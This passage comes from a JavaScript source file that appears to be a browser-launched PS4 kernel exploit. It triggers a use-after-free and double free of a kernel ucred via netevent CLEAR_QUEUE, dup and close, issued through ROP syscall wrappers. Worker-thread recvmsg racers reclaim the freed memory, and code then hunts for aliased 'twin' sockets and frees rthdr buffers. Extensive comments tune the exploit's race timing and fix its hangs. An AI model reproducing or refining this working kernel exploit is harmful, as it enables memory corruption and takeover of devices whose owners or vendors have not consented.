            BETWEEN CLEAR_QUEUE AND dup+close -- the exact window the whole
            arm depends on. If the reclaim did not actually park and wake the
            workers, cr_refcnt is not driven back to 1, and dup+close then
            decrements a FREED ucred. That is a double free of something that
            was already free, and it is a live candidate for the crash this
            stage is blamed for.

            Now: park, wait for the count to STOP DROPPING (parkSettle, the
            same measurement unparkAll uses), wake exactly that many, and
            drain at most that many with an EAGAIN break. A round where
            nothing parked does nothing.

            parkSettle is declared with `function`, so it is hoisted and
            callable from here even though its definition is further down.
            */
            /*
            DEFAULT IS OFF, AND THIS IS THE FREEZE. COMPARE THE SNAPSHOT.

            netctrl_snapshot.js:775-790 -- the build that actually reached
            DOUBLE-FREE and TWINS -- has NOTHING here. Between
            netevent(CLEAR_QUEUE) and sc(SYS.dup) it runs exactly four things,
            and every one of them is SYNCHRONOUS:

                mark("UAF-ARMED", ...)                 <- synchronous DOM write
                committed = true;
                localStorage.setItem(...)              <- synchronous
                for (i < 0x80) sc(SYS.sendmsg, 0, ...) <- synchronous ROP x128
                const d1 = sc(SYS.dup, uafSock).i32;   <- synchronous ROP
            The only `await` anywhere in that window is sc() itself, and sc()
            is a synchronous ROP call on the main thread -- it never hands
            control back to the JS event loop. So in the snapshot the ucred is
            freed and re-held within one unbroken synchronous stretch.

            THIS FILE DOES THE OPPOSITE. The loop below returns to the event
            loop AT LEAST FOUR TIMES PER ROUND, 32 ROUNDS OVER, with the ucred
            freed and uafSock still pointing at it:

                await breathe()                      (line ~1463)
                await parkSettle(...)                -> setTimeout(0) macrotask
                await scheduleJoin(...)              -> up to UNPARK_MS (4000)
                await rescueRacers(...)              -> up to rescuems (1500)

            parkSettle contains `await new Promise(r => setTimeout(r, 0))`
            (line ~2190) and scheduleJoin arms a real `setTimeout(resolve, ms)`.
            Both are MACROTASKS. Each one lets the browser process run GC,
            timers, and every queued XHR while the kernel is holding a freed
            ucred -- the exact hazard the UAF-ARMED comment below describes,
            and a far wider window than any single log write.

            The reference ordering (netctrl-vue.js:1199-1210) does park and
            wake racers there too, but that reference is a synchronous
            implementation: trigger_iov_recvmsg()/wait_iov_recvmsg() never
            return to an event loop mid-window. Reproducing it in JS with
            `await` does not reproduce the timing, it destroys it.

            So the reclaim is OPT-IN. That matches the snapshot's proven path
            -- which is what the user reports working -- and it removes the
            freeze structurally rather than tuning it. Use
            ?prerounds=32 to experiment with the racer reclaim, or
            ?prerounds=0 to state the snapshot behaviour explicitly.
            */
            const PRE_REFCOUNT_ROUNDS = params.has("prerounds")
                ? parseInt(params.get("prerounds"), 10) : 0;
            /*
            parkSettle() closes over PARK_SETTLE_MS, and its definition sits
            FURTHER DOWN this function. The function declaration itself is
            hoisted, but the const it reads is not -- so calling parkSettle
            from here before line ~1312 has executed would throw a TDZ
            ReferenceError on the very first round.

            Declare it here instead, above the first call, and leave the later
            comment as the explanation rather than a second declaration.
            */
            const preParkMs = params.has("parksettle")
                ? parseInt(params.get("parksettle"), 10) : 20;
            /*
            THE SAME TDZ, WHICH THE PARK_SETTLE_MS FIX DID NOT COVER.

            parkSettle() takes its budget as a PARAMETER now, so it no longer
            reads a not-yet-initialised const -- but the three bindings that
            wakeRacers() closes over were left where they were, ~700 lines
            below this loop:

              const WAKE_SLOT_MAX = iovWorkers.length;   (was line ~2094)
              let wakeWrites = 0, wakeRefused = 0;       (was line ~2095)

            wakeRacers is a function DECLARATION, so it is hoisted and the
            call on the next line but one resolves. What is not hoisted is the
            `let`/`const` state inside it: `wakeWrites += woke` and
            `wakeRefused++` both read a binding that has not been initialised
            yet, which throws
              ReferenceError: Cannot access 'wakeWrites' before initialization
            on the FIRST iteration of this reclaim loop -- i.e. immediately
            after `step=clear-queue`, with CLEAR_QUEUE already run, the ucred
            freed, and uafSock still pointing at it.

            That is the freeze this loop's own comments keep attributing to
            other causes. The throw is caught by the outer catch, but that
            handler's mark() is a DOM write plus an XHR in the WebProcess --
            fatal in this exact window -- so the console dies reporting
            nothing, and the status stays on `attempt N...` with
            `step=clear-queue` as the last line: the loop never completed a
            round to reach the next one.

            Declare all three here, above the first call, exactly as preParkMs
            was. The later declarations are removed.
            */
            const WAKE_SLOT_MAX = iovWorkers.length;
            let wakeWrites = 0, wakeRefused = 0;
            const preTasks = new Array(iovWorkers.length);
            let preParked = 0, preRounds = 0;
            for (let i = 0; i < PRE_REFCOUNT_ROUNDS; ++i) {
                /*
                NO YIELD ON ROUND 1.

                This loop used to `await breathe()` as its FIRST statement on
                every round, including round 1. Round 1 is the one that matters:
                CLEAR_QUEUE has just freed the ucred and NO racer has parked
                yet, so the yield lets the browser process run (GC, timers, the
                pending XHRs from every earlier mark) while uafSock still points
                at freed memory. The reference never yields there -- it goes
                write32 -> netcontrol -> trigger_iov_recvmsg() with no return to
                the event loop at all.

                So round 1 fires the racers with NO yield first, and only rounds
                2..32 (where a racer is already inside recvmsg and holding the
                chunk) take the breathe(). This is the difference between "the
                chunk is free and unheld while the browser process runs" and
                "the chunk is free for the length of one fireW burst".
                */
                if (i) await breathe();
                preRounds = i + 1;
                /*
                console.log, NOT mark(). This is the free window and it is the
                one place a WebProcess-DOM log write is fatal while a
                browser-process one is not -- the Inspector console (and the
                trail's own console.log) live in the browser process and survive
                the WebProcess. One line, no DOM, no XHR, no storage.
                */
                try { console.log("[S10] pre-reclaim round=" + preRounds
                    + " uaf_sock=" + uafSock); } catch (e) { }
                for (let k = 0; k < iovWorkers.length; ++k) {
                    const t = fireW(iovWorkers[k], SYS.recvmsg,
                        [iovSs[0], msgAddr, 0], 0);
                    /*
                    Tag them the way fireTracked does, or parkSettle would
                    read `settled === undefined` and count every worker as
                    parked -- silently reproducing the fixed-size behaviour
                    while pretending to measure it.

                    Bind `t` LOCALLY. The previous version wrote
                        preTasks[k].then(() => { preTasks[k].settled = true; })
                    which re-reads preTasks[k] when the callback RUNS, not when
                    it is registered. That happens to land on the right
                    element only while k still points at it; it is a closure
                    over the loop variable, not over the promise. Capturing the
                    promise in `t` makes the intent explicit and cannot drift.
                    */
                    t.settled = false;
                    t.then(() => { t.settled = true; },
                        () => { t.settled = true; });
                    preTasks[k] = t;
                }
                sc(SYS.sched_yield);
                const parked = await parkSettle(preTasks, preParkMs);
                if (parked > preParked) preParked = parked;
                /*
                DRAIN, then a BOUNDED, RETURN-CHECKED wake. This runs inside
                the free->hold window, so a write that blocks here does not
                just hang the run -- it hangs it with CLEAR_QUEUE already
                executed and the ucred still unheld. Same discipline as
                unparkAll: clear the buffer first, write at most one byte per
                parked racer, and stop on the first refusal instead of
                sleeping in the kernel.
                */
                conserveWakes();
                const preWoke = wakeRacers(parked);
                if (preWoke < parked)
                    mark("PRE-REFCOUNT-SHORT-WAKE", "wanted=" + parked
                        + " wrote=" + preWoke + " refused=" + wakeRefused
                        + " -- send buffer full; not blocking on another write");
                /*
                BOUNDED JOIN. `await Promise.all(preTasks)` had NO DEADLINE,
                and that is the freeze.

                preTasks are fired with timeoutMs = 0, which makeRpc
                (workers.js:58) reads as "no timer, never rejects". So this
                await settles only when every worker's fire() handler returns
                -- and a worker whose recvmsg parked without ever being woken
                returns never. The loop then cannot advance, the finally
                cannot run, the main thread stays realtime-pinned on MAIN_CORE,
                and the console has to be pulled. That is exactly the
                screenshot: the log ends on `step=clear-queue-done rv=0` and
                nothing after it, because the next thing this code does is
                block on a promise set that can never settle.

                The round-tail race below already learned this -- it uses
                scheduleJoin for exactly this reason -- but the pre-refcount
                reclaim was written before that helper existed and kept the
                bare Promise.all. Same failure, one stage earlier.

                This is the more dangerous of the two places to hang, because
                CLEAR_QUEUE has ALREADY run: the ucred is freed and uafSock
                still points at it, and the reclaim that was supposed to drive
                cr_refcnt back to 1 is the thing that stopped. A hang here
                leaves the kernel holding a freed ucred with no way to
                recover except a power cycle.
                */
                await scheduleJoin(preTasks, UNPARK_MS);
                /*
                AND WAKE WHATEVER scheduleJoin LEFT BEHIND, rather than
                looping on. A racer that missed its byte is one write away
                from returning; firing the NEXT round's recvmsg at it instead
                would queue a second racer on a worker that has not finished
                the first -- which is how a worker ends up permanently
                un-joinable. rescueRacers drains, wakes only what is still
                parked, and stops at its own budget.
                */
                let preLeft = preTasks.filter(t => !t.settled).length;
                if (preLeft) {
                    await rescueRacers(preTasks, "pre-refcount");
                    preLeft = preTasks.filter(t => !t.settled).length;
                }
                /*
                IF THE RACERS COULD NOT BE FREED, STOP. Continuing would fire
                four more recvmsg calls per round at workers still inside the
                previous one, spend the whole PRE_REFCOUNT_ROUNDS budget, and
                change nothing -- while the freed ucred stays unreclaimed. One
                honest mark and out is strictly better than 31 silent rounds.
                */
                if (preLeft) {
                    mark("PRE-REFCOUNT-CLAIM-STALLED", "round=" + preRounds
                        + "/" + PRE_REFCOUNT_ROUNDS + " parked=" + preLeft
                        + "/" + iovWorkers.length
                        + " -- racers did not return, so cr_refcnt cannot"
                        + " reach 1; abandoning the reclaim instead of firing"
                        + " more recvmsg at workers that never came back");
                    break;
                }
                /*
                Bounded drain, unchanged in intent: at most `parked` bytes, so
                a short queue is a counted shortfall rather than a park.
                */
                for (let k = 0; k < parked; ++k) {
                    if (sc(SYS.read, iovSs[0], scratch, 1).i32 <= 0) break;
                }
            }
            /*
            ARM CONFIRMED -- AND ONLY NOW IS IT SAFE TO LOG IT.

            The reclaim loop above has re-taken the freed chunk with a parked
            iovec and driven cr_refcnt back to 1, so uafSock is live again. The
            arm's log line, the committed flag and the committed-boot write all
            live HERE rather than beside CLEAR_QUEUE, because every one of them
            is main-thread/browser-process work that must not sit in the
            free->hold window (see the note above where the heavy mark used to
            be). This is the same ordering the reference uses and the same
            shape the frozen snapshot had.
            */
            /*
            CONSOLE FIRST, DOM SECOND.

            console.log goes to the BROWSER process and survives this
            WebProcess dying; mark() writes the #console DOM and an XHR, which
            do not. If the process dies in this stage, the browser console (and
            the [TRAIL] lines trailPush already emits) is the only record left
            -- so the arm is announced there BEFORE anything that can die.
            */
            try {
                console.log("[S10] UAF-ARMED fd=" + uafSock + " clear_rv=" + clr.rv
                    + " attempt=" + attempt + "/" + NUM_ATTEMPT
                    + " burned=" + burned.size
                    + " pre_rounds=" + preRounds + "/" + PRE_REFCOUNT_ROUNDS
                    + " max_parked=" + preParked + "/" + iovWorkers.length);
            } catch (e) { }
            mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
            committed = true;
            try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
            catch (e) { }
            trace("UAF-ARMED-DETAIL", "attempt=" + attempt + "/" + NUM_ATTEMPT
                + " burned=" + burned.size
                + (burned.size ? " burned_fds=" + [...burned].join(",") : "")
                + " uaf_ss=" + iovSs.join(","));
            mark("PRE-REFCOUNT", "rounds=" + preRounds + "/" + PRE_REFCOUNT_ROUNDS
                + " workers=" + iovWorkers.length
                + " max_parked=" + preParked + "/" + iovWorkers.length
                + " uaf_sock=" + uafSock
                + (PRE_REFCOUNT_ROUNDS === 0
                    ? " -- reclaim DISABLED (snapshot path): CLEAR_QUEUE -> dup"
                        + " with no event-loop turn, so there is no parked count"
                        + " to satisfy"
                    : preParked < iovWorkers.length
                        ? " -- WARNING: never parked all racers; the reclaim may"
                            + " not have driven cr_refcnt back to 1"
                        : ""));

            if (STOP_BEFORE_DOUBLE) {
                mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
                rebootRequired = true;
                rebootReason = "stop-before-double (uaf armed, not contained)";
                break;
            }

            /*
            DO NOT COMMIT AN UNPROVEN DOUBLE FREE.

            CLEAR_QUEUE has already run and has already freed the ucred. The
            ONLY thing that makes the dup+close below safe is that the reclaim
            loop re-took that chunk and drove cr_refcnt back to 1 first. If no
            racer ever parked, that never happened: the ucred is freed and
            still refcounted as if live, and dup+close then decrements memory
            nobody owns.

            That is a double free of an already-free object, and it is the
            shape of the crash this stage is named for. So: when the reclaim
            cannot be shown to have parked every racer, drop the arm instead of
            committing on top of it. The attempt is abandoned AND the console
            is marked reboot-required either way -- CLEAR_QUEUE has run, so the
            kernel is not clean regardless of which branch we take. The
            difference is only whether we make it worse.

            ?reclaimforgive=1 overrides, for an operator who wants the old
            behaviour while instrumenting this stage.
            */
            /*
            THE RECLAIM GATE ONLY APPLIES WHEN THE RECLAIM ACTUALLY RAN.

            `preParked >= iovWorkers.length` is the proof that the racer
            reclaim drove cr_refcnt back to 1, and it is the ONLY thing that
            makes dup+close safe. But with ?prerounds= off -- the default, and
            the snapshot's path -- no racer is ever fired, so preParked is 0
            and this test is `0 >= 4`: false. Taking the halt branch here would
            refuse every run before it could reach dup+close, i.e. it would
            turn "reclaim disabled" into "cannot make progress at all", which
            is worse than the freeze it replaced.

            The gate is therefore conditional on the reclaim being enabled. On
            the snapshot path (PRE_REFCOUNT_ROUNDS === 0) it does not apply,
            because nothing claimed to have re-held the chunk and the
            snapshot's arm -- CLEAR_QUEUE then straight to dup, all synchronous
            -- is the ordering that was proven to work. The check() still
            reports which path was taken so the log cannot be misread.
            */
            const reclaimRan = PRE_REFCOUNT_ROUNDS > 0;
            const reclaimProven = !reclaimRan || preParked >= iovWorkers.length;
            if (!reclaimRan) {
                check("pre-refcount-reclaim-parked", true,
                    "reclaim disabled (?prerounds=0) -- snapshot path:"
                    + " CLEAR_QUEUE -> dup, no event-loop turn");
            } else if (!reclaimProven && params.get("reclaimforgive") !== "1") {
                mark("RECLAIM-UNPROVEN", "max_parked=" + preParked + "/"
                    + iovWorkers.length + " after " + preRounds
                    + " rounds -- NOT committing dup+close; "
                    + "cr_refcnt was never driven back to 1");
                check("pre-refcount-reclaim-parked", false,
                    "max_parked=" + preParked + "/" + iovWorkers.length);
                /*
                STOP. DO NOT CLOSE THE ARMED SOCKET AND DO NOT RETRY.

                The first version of this guard did:
                    if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                    continue;
                and that is itself an instant double free, which is why the
                run died the moment it took this branch.

                CLEAR_QUEUE has ALREADY freed this socket's ucred. close() on
                the same fd then frees the struct file that still references
                it -- a second free of memory the kernel has already handed to
                a zone, executed by the very guard whose job was to PREVENT
                that. uafSock is not a socket to tidy up; it is the armed one.

                And it must not retry either. `committed` is already true and
                the fd table already holds freed state. A second attempt arms
                a FRESH dummy socket on top of it, so now two arming sequences'
                worth of freed file/ucred are live at once. There is nothing to
                gain and a lot to lose in going round again.

                So: leave the socket OPEN (the finally's UAF-SOCK-LEFT-OPEN
                mark already reports exactly this, and leaking one fd is the
                documented safe choice everywhere else in this file), mark the
                console reboot-required, and break out of the attempt loop.
                ?reclaimforgive=1 still restores the old commit-on-top
                behaviour for instrumentation.
                */
                rebootRequired = true;
                rebootReason = "reclaim-unproven (uaf armed, not contained)";
                uncontained = "reclaim-unproven";
                mark("RECLAIM-UNPROVEN-HALT", "uaf_sock=" + uafSock
                    + " left OPEN (closing it would free the struct file"
                    + " CLEAR_QUEUE already freed); no retry -- committed="
                    + committed + " reboot=1");
                break;
            }
            check("pre-refcount-reclaim-parked", true,
                "max_parked=" + preParked + "/" + iovWorkers.length);

            const d1 = sc(SYS.dup, uafSock).i32;
            if (d1 === -1) { mark("ATTEMPT-SKIP", "dup failed"); rebootRequired = true; rebootReason = "dup-failed"; continue; }
            sc(SYS.close, d1);
            rebootRequired = true;
            rebootReason = "double-free-committed";
            /*
            THE NUMBER HERE IS AN FD, NOT A COUNT.

            "dup=2 closed" reads as "two duplicates closed" and is not that: it
            is the fd the dup() landed on. That is now stated explicitly, along
            with the socket the duplicate came FROM, because the fd number alone
            cannot be checked against anything -- uafSock is the fd whose
            refcount this just decremented, and it is the one value that makes
            the line meaningful when reading back a crash.

            The same fix is applied to TRIPLE-FREE below.
            */
            mark("DOUBLE-FREE", "dup_fd=" + d1 + " (NEW FD, not a count)"
                + " closed; uaf_sock=" + uafSock
                + " attempt=" + attempt + "/" + NUM_ATTEMPT);

            /*
            Read the twin budget HERE rather than at the top of the file, so
            ?twinrounds= is honoured and the clamp is visible where it is used.
            A non-positive value would make findTwins return null without
            scanning at all, which reads as no-twins -- refuse it.
            */
            const TWIN_ROUNDS = (function () {
                const n = params.has("twinrounds")
                    ? parseInt(params.get("twinrounds"), 10) : MAX_ROUNDS_TWIN;
                return ((n | 0) === n && n >= 1 && n <= 1000) ? n : MAX_ROUNDS_TWIN;
            })();
            twins = await findTwins(TWIN_ROUNDS);
            if (!twins) {

                /*
                No socket showed a duplicate tag: either the double free did
                not take, or it did and the scan missed it -- indistinguishable
                from here (poops.js:4443 says the same). Nothing is KNOWN to be
                aliased, so there is nothing to burn. Drop the spent fd, retry.
                */
                if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                mark("ATTEMPT-RETRY", "after=no-twins next="
                    + (attempt + 1) + "/" + NUM_ATTEMPT);
                continue;
            }
            mark("TWINS", "a=" + twins.a + " b=" + twins.b
                + " round=" + twins.round);

            freeRthdr(twins.b);
            let reclaimed = false, rounds = 0;
            raceReads.length = 0;

            /*
            How long parkSettle() waits for the racer count to stop dropping.
            Declared HERE, above unparkAll(), because unparkAll reads it and a
            const is not hoisted -- putting it next to parkSettle (further
            down) would be a TDZ error on the first round.
            */
            const PARK_SETTLE_MS = params.has("parksettle")
                ? parseInt(params.get("parksettle"), 10) : 20;

            /*
            Unpark whatever the workers are holding. The round tail used to
            inline these two loops, and the `!reclaimed` retry tail repeats
            them because `tasks` still holds live, parked promises there.
            Calling it from one place makes the unpark auditable: it returns
            how many workers did NOT answer, which is the number the failure
            line needs.
            */
            /*
            scheduleJoin: Promise.all with a wall-clock bound, for a set of
            promises created with timeoutMs = 0 ("wait forever").

            unparkAll used a bare `await Promise.all(ts)` and those racers were
            fired with a 0 timeout, so there was NO deadline on the exact path
            that exercises the race -- every other loop in this file has one
            (RACE_MS, uioDeadline, fakeDeadline), this one had none. If a
            worker is wedged inside the kernel the main thread parks there for
            good: no summary, no finally, and the console has to be pulled.

            This settles when every promise settles OR when `ms` elapses,
            whichever is first, so the caller always regains control and can
            report HOW MANY never came back. Rejection is swallowed for the
            same reason the fire-and-forget restore loop swallows it -- the
            answer we need is "did it settle", not "did it succeed".
            */
            function scheduleJoin(ts, ms) {
                let pending = ts.length;
                return new Promise(function (resolve) {
                    if (!pending) { resolve(); return; }
                    const done = function () {
                        if (--pending === 0) { clearTimeout(timer); resolve(); }
                    };
                    const timer = setTimeout(resolve, ms);
                    for (const t of ts) t.then(done, done);
                });
            }

            /*
            PARKED, OR FINISHED -- AND THE DIFFERENCE IS THE WHOLE RACE.

            A racer fired with timeoutMs = 0 NEVER REJECTS. makeRpc
            (workers.js:54-65) only installs a timer when effective > 0, and
            fireTracked/fireW pass 0 on purpose. So `t.settled === false`
            after parkSettle() means exactly one of two things, and the
            current code cannot tell them apart:

              * the worker is PARKED inside recvmsg -- the state the whole
                double-free race needs, and the one a wake byte releases; or
              * the worker FINISHED, its reply came back over postMessage,
                and the `.then` that latches settled=true has not run yet
                because this count happens in the same synchronous turn as
                the reply.

            Calling the second one "parked" is not cosmetic. unparkAll()
            derives the number of wake bytes from this count, and a byte
            written for a worker that is not in recvmsg stays in the
            socketpair buffer, where the drain at the tail -- or the NEXT
            round's drain -- consumes a byte that belonged to someone else.
            That is the drift the UNPARK comment describes as "self-
            correcting"; it self-corrects only because the residue is drained
            later, and draining a byte for worker A while worker B keeps
            waiting is exactly how a racer ends up parked forever.

            A parked worker CANNOT have produced a result: its `fire` handler
            is still on the stack inside Math.expm1. So ask the context
            whether a result landed. ctx.frameDv is the same frame the
            IOV-RETS/IOV-RELEASED marks read afterwards, so this uses the one
            signal the file already trusts, and it needs nothing new passed
            in.
            */
            function racerMask(ts) {
                let parked = 0, done = 0;
                for (let k = 0; k < ts.length; ++k) {
                    if (ts[k].settled) { done++; continue; }
                    const w = iovWorkers[k];
                    /*
                    read8/read4 into a frame that a live fire() is still
                    writing would be a data race, but the read only happens
                    for a promise that has NOT settled -- i.e. no reply has
                    arrived -- so the frame is either the worker's own
                    untouched layout or already finished. Either way the
                    value is stale-or-unrelated, which is why only the zero / non-zero
                    test is used, never the value.
                    */
                    let touched = false;
                    try {
                        touched = w && w.ctx && w.ctx.frameDv.getUint32(0, true) !== 0;
                    } catch (e) { touched = false; }
                    if (touched) done++; else parked++;
                }
                return { parked: parked, done: done };
            }

            async function unparkAll(ts) {
                /*
                PHASE MARK, not decoration.

                unparkAll is three steps with no logging anywhere in it and it
                runs immediately after IOV-PARKED -- which makes it the single
                most likely place for a run to die without a trace. If the
                console goes down inside here, the last thing in the log is
                this line, and `phase=` says which of the three steps it was:

                  phase=sent      the 4 bytes are on the wire; the racers have
                                  been woken and are unwinding OUT of the
                                  kernel. A death after this point is the
                                  kernel faulting on the freed chunk -- the
                                  race losing, not a JS bug.
                  phase=joined    every worker answered. The kernel survived
                                  the wake; anything later is ours.
                  phase=bounded   the deadline expired with workers still
                                  parked. The kernel did NOT fault, but the
                                  wake did not land either -- distinguishable
                                  from both of the above, and previously
                                  indistinguishable from a hang.
                */
                /*
                WAKE EXACTLY AS MANY BYTES AS THERE ARE PARKED RACERS.

                This used to write iovWorkers.length bytes and read
                iovWorkers.length bytes UNCONDITIONALLY, whether or not any
                worker had actually reached recvmsg. A byte written for a
                worker that was not parked yet stays in the socketpair buffer,
                and the matching read at the tail then consumes a byte that
                belonged to a DIFFERENT worker's wake -- or consumes nothing
                anyone wrote. Over NUM_IOV_SPRAY rounds that drifts, silently:
                scratch is 0x1000 bytes and the reads never checked a return
                value.

                The symptom of the drift is precisely the run that reports
                `phase=bounded still_parked=N/4` -- the racers never came back,
                because the bytes meant to wake them had already been drained
                by an earlier round.

                Now the count is DERIVED from the promises themselves:
                `parked` is how many had not settled when we looked. We write
                that many bytes, and we read back at most that many. A round
                where nobody parked writes and reads nothing, so no byte can
                be carried over.

                `drained` is what actually came off iovSs[0]. With O_NONBLOCK
                a missing byte is EAGAIN (negative) rather than a permanent
                park of the WebProcess, so the shortfall is countable instead
                of fatal.

                KNOWN RACE, and it is stated rather than hidden: a worker can
                settle between the write and the read, or a late parker can
                miss the byte that was written for it. Both leave exactly one
                byte in the buffer for the next round to drain, and the next
                round's drain is bounded by ITS parked count -- so the residue
                is reported at `residue=` and self-corrects rather than
                accumulating. A round with nothing parked still drains nothing,
                which is the property the old code lacked.
                */
                await parkSettle(ts);
                let m = racerMask(ts);
                const parked = m.parked;
                const jt0 = Date.now();
                mark("UNPARK", "phase=sent n=" + iovWorkers.length
                    + " parked_before=" + parked + "/" + iovWorkers.length
                    + (m.done ? " already_done=" + m.done
                        + " (replies landed, promises not latched yet)" : ""));
                /*
                DRAIN FIRST, THEN WAKE ONLY THE PARKED SET. The old loop wrote
                `parked` bytes with the buffer possibly still holding the last
                round's residue -- which is how it got deep enough to fill and
                block. conserveWakes() first makes the write depth bounded by
                the number of racers that are genuinely inside recvmsg.
                */
                conserveWakes();
                const wokeBytes = wakeRacers(parked);
                if (wokeBytes < parked)
                    mark("UNPARK-SHORT-WAKE", "wanted=" + parked
                        + " wrote=" + wokeBytes + " refused=" + wakeRefused
                        + " -- send buffer full; the queued bytes are the wake"
                        + " and the next conserve pass clears the rest");
                await scheduleJoin(ts, UNPARK_MS);
                let drained = 0;
                for (let k = 0; k < parked; ++k) {
                    const rv = sc(SYS.read, iovSs[0], scratch, 1).i32;
                    if (rv > 0) drained++;
                    else break;   /* EAGAIN: nothing more queued. Never block. */
                }
                m = racerMask(ts);
                const left = m.parked;
                const residue = parked - drained;
                mark("UNPARK", (left ? "phase=bounded" : "phase=joined")
                    + " still_parked=" + left + "/" + iovWorkers.length
                    + " woke=" + drained + "/" + parked
                    + " residue=" + residue
                    + " ms=" + (Date.now() - jt0)
                    + (left ? " -- " + left + " worker(s) never came back;"
                        + " the kernel is parked or wedged, not faulted;"
                        + " the next round rescues them if they are only"
                        + " short a wake byte, and reports a fire() timeout"
                        + " if they are truly wedged" : "")
                    + (residue > 0 ? " -- " + residue + " wake byte(s) unread;"
                        + " a conserve pass clears them rather than letting"
                        + " the next round's drain eat a byte meant for a"
                        + " different racer" : ""));
                return left;
            }

            /*
            UNPARK WHAT IS STILL PARKED, WITHOUT SPINNING A NEW ROUND.

            The race loop fires all four racers at the TOP of every round, so
            once a round has ended with racers still inside recvmsg the only
            ways to free them are (a) the next round's wake, or (b) this.
            Option (a) is what "worker-0: timeout waiting for fire" actually
            is: the wedged racer is not wedged at all, it is one wake byte
            short, and the round that eventually fires for it is a LATER round
            than the one that lost it -- so the timeout is reported one round
            late, and the round that is blamed is innocent.

            This is the positive counterpart to the drift: instead of waking
            only the computed parked set, it wakes EVERY racer that has not
            answered and keeps waking until none are left or the budget runs
            out. Extra bytes are impossible to mis-target because a byte for a
            worker that is already out is simply drained by the conserve pass
            below -- it is never left in the buffer for the next round to
            attribute to the wrong racer.

            Returns the number still parked when it gave up.
            */
            async function rescueRacers(ts, why) {
                const t0 = Date.now();
                const budget = params.has("rescuems")
                    ? parseInt(params.get("rescuems"), 10) : 1500;
                let pass = 0, parkedNow = racerMask(ts).parked;
                if (!parkedNow) return 0;
                const start = parkedNow;
                while (Date.now() < t0 + budget) {
                    pass++;
                    /*
                    DEADLOCK-SAFE, and the order matters: drain BEFORE the
                    write pass, and write one byte per racer that is actually
                    parked -- not one per worker. The old body wrote
                    iovWorkers.length bytes with no drain and no return check,
                    which is what could fill the socketpair send buffer and
                    park the whole WebProcess inside sc(write).
                    */
                    conserveWakes();
                    const want = racerMask(ts).parked;
                    const woke = wakeRacers(want);
                    /*
                    A REFUSED WAKE IS NOT A REASON TO KEEP WRITING. If the
                    buffer is full with `want` bytes already queued, the
                    parked racers will consume what is there; looping again
                    would only re-fill it. Give the event loop the turn that
                    lets those replies land, then re-measure.
                    */
                    if (woke < want) {
                        await new Promise(r => setTimeout(r, 0));
                        await scheduleJoin(ts, 50);
                        conserveWakes();
                        parkedNow = racerMask(ts).parked;
                        if (!parkedNow) break;
                        /*
                        Nothing moved and the buffer was full: the racers are
                        inside the kernel, not short of a byte. Continuing
                        would spend the whole budget on writes that cannot
                        land, so stop and let the caller report it.
                        */
                        if (parkedNow >= want) break;
                        continue;
                    }
                    await scheduleJoin(ts, 200);
                    conserveWakes();
                    parkedNow = racerMask(ts).parked;
                    if (!parkedNow) break;
                }
                mark("RACERS-RESCUED", "why=" + why + " was=" + start
                    + " now=" + parkedNow + "/" + iovWorkers.length
                    + " passes=" + pass + " ms=" + (Date.now() - t0)
                    + " wake_bytes=" + wakeWrites
                    + (wakeRefused ? " refused=" + wakeRefused : "")
                    + (parkedNow ? " -- still inside the kernel; the next"
                        + " fire() for these will report a timeout and the"
                        + " run will say so at IOV-PARK" : ""));
                return parkedNow;
            }

            /*
            DRAIN WHATEVER WAKE BYTES ARE STILL QUEUED, AND NOTHING MORE.

            The residue problem has two ends. unparkAll() bounds the drain by
            its parked count, so it can leave bytes behind; a round that
            writes for a worker which is no longer parked leaves bytes behind
            too. Either way the leftover byte sits in iovSs[0] and the NEXT
            round's drain -- which is bounded by ITS count -- consumes it, so
            a byte meant for racer A releases racer B.

            Fixing the write side is not enough on its own (a late parker can
            still miss its byte), so this runs the drain to EAGAIN with no
            count at all. iovSs[0] is O_NONBLOCK, so an empty socketpair is a
            negative return, not a park: this cannot block. The cost is one
            extra sc(read) per round on the fast path.
            */
            function conserveWakes() {
                let n = 0;
                for (let k = 0; k < iovWorkers.length; ++k) {
                    if (sc(SYS.read, iovSs[0], scratch, 1).i32 <= 0) break;
                    n++;
                }
                return n;
            }

            /*
            *** THE UNPARK DEADLOCK, AND WHY IT HAD TO BE FIXED HERE ***

            THE HANG. The wake write (`sc(SYS.write, iovSs[1], ...)`) is a
            SYNCHRONOUS syscall on the main JS thread. When the AF_UNIX stream
            socket's
            send buffer is full, a blocking write SLEEPS IN THE KERNEL and
            does not return. Nothing on the JS side can run while it sleeps:
            not the setTimeout in scheduleJoin, not the Date.now() test at the
            top of rescueRacers, not the postMessage that would deliver a
            racer's reply. The replies are the ONLY thing that drains the
            buffer. So a write that blocks is a write that can never be
            unblocked, and the console has to be pulled. That is "stuck here",
            and the screenshot -- IOV-PARK round=1 of 256, ms=49, nothing
            after it -- is exactly this state.

            WHY THE BOUNDS DID NOT SAVE IT. rescueRacers' budget is a wall
            clock read on the JS thread, so it cannot expire inside sc(write).
            scheduleJoin's deadline is a timer, so it cannot fire either. A
            wall-clock or timer bound cannot bound a synchronous call -- it
            only bounds what happens BETWEEN those calls.

            WHY O_NONBLOCK DID NOT SAVE IT. iovSs[1] is set O_NONBLOCK, and
            that makes the write return EAGAIN instead of sleeping once the
            buffer is full -- but the old code did not READ the return:

                for (let k = 0; k < parked; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);

            A refused byte and a delivered byte were therefore identical to
            the caller, and the counts built on top of that loop (`drained`,
            `residue`) could never be trusted. It also means the O_NONBLOCK
            protection depends on the fd's CURRENT flags, which kreadSlow and
            kwriteSlow overwrite with SO_SNDBUF settings later in the run.

            THE FIX, and it is structural rather than a bigger budget:

              1. COUNT THE WRITES AND CHECK THE RETURN. wakeRacers() returns
                 how many bytes actually went out, so a shortfall is measured
                 rather than assumed, and a full buffer stops the loop instead
                 of sleeping in it.
              2. NEVER WRITE MORE THAN THE PARKED SET. unparkAll already
                 derives `parked`; rescueRacers used to write one byte per
                 WORKER unconditionally, which is how the buffer got deep
                 enough to fill in the first place.
              3. BOUND THE TOTAL, so even a kernel that ignores O_NONBLOCK on
                 this socketpair cannot park the thread more than
                 WAKE_SLOT_MAX bytes deep -- one per worker is the ceiling of
                 anything a wake can usefully be, and it is reached only when
                 every worker is genuinely parked.

            Returns the number of wake bytes that actually landed.
            */
            /*
            WAKE_SLOT_MAX / wakeWrites / wakeRefused are declared ABOVE, beside
            preParkMs, because the pre-refcount reclaim loop calls this
